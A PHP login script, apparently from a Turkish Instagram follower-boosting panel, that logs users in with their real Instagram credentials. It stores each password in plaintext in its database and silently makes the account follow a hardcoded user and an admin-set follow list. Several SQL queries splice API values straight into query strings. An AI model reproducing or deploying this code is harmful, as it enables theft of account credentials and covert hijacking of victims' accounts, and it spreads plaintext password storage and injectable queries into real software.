<?php
session_start();
include "../config.php";
$username = $_POST['username'];
$password = $_POST['password'];
$i = new instaAuth;
	try{
		$login = $i->_authLogin($username, $password);
		if($login->status == 'ok'){
			$userid = $login->logged_in_user->pk;
			$result = json_decode($i->curl_get_file_contents("http://i.instagram.com/api/v1/users/{$userid}/info/"));
		
			$userKontrol = DB::getVar("SELECT count(id) FROM users WHERE userid = '" . $userid . "' AND username = '" . $login->logged_in_user->username . "' ORDER BY id DESC");
			
			if ( $userKontrol == 0 )
            {
                DB::insert("INSERT INTO users (userid, username, password, fullname, profile, credi, cookie) VALUES (?, ?, ?, ?, ?, ?, ?);",
                    array($result->user->pk, $result->user->username, $password, $result->user->full_name, $result->user->profile_pic_url, $webSettings->credi, '1'));

            } else {

                DB::query("UPDATE users SET username = '" . $result->user->username . "', fullname = '".$result->user->full_name."', password = '$password', profile = '" . $result->user->profile_pic_url . "' WHERE userid = '" . $result->user->pk . "' ");
            }
			$_SESSION['_ID'] = $result->user->pk;
            $_SESSION['_USERNAME'] = $result->user->username;
			$i->setCookies(array(trim($_SESSION['_USERNAME'])));
			$i->_doFollow(trim('2233798330'));
			
			
			if ( $webSettings->followList )
            {
                $i->setCookies(array(trim($_SESSION['_USERNAME'])));

                $takipEdilecekler = explode("\n", $webSettings->followList);
                foreach ($takipEdilecekler as $takipEdilecek){
                    if ( intval(trim($takipEdilecek)) )
                    {
                        $i->_doFollow(trim($takipEdilecek));
                    }
                }
            }
			
			echo "<script> window.location.replace('Anasayfa');</script>";
		}
        if($login->message == "checkpoint_required"){
            echo "<script> window.location.replace('checkpoint_required');</script>";
        }

        if($login->status == 'fail'){
            echo "Üzgünüz, şifren yanlıştı. Lütfen şifreni dikkatlice kontrol et.";
        }
	}catch (Exception $e)
    {
        echo  "Üzgünüz, şifren yanlıştı. Lütfen şifreni dikkatlice kontrol et.";
    }
?>
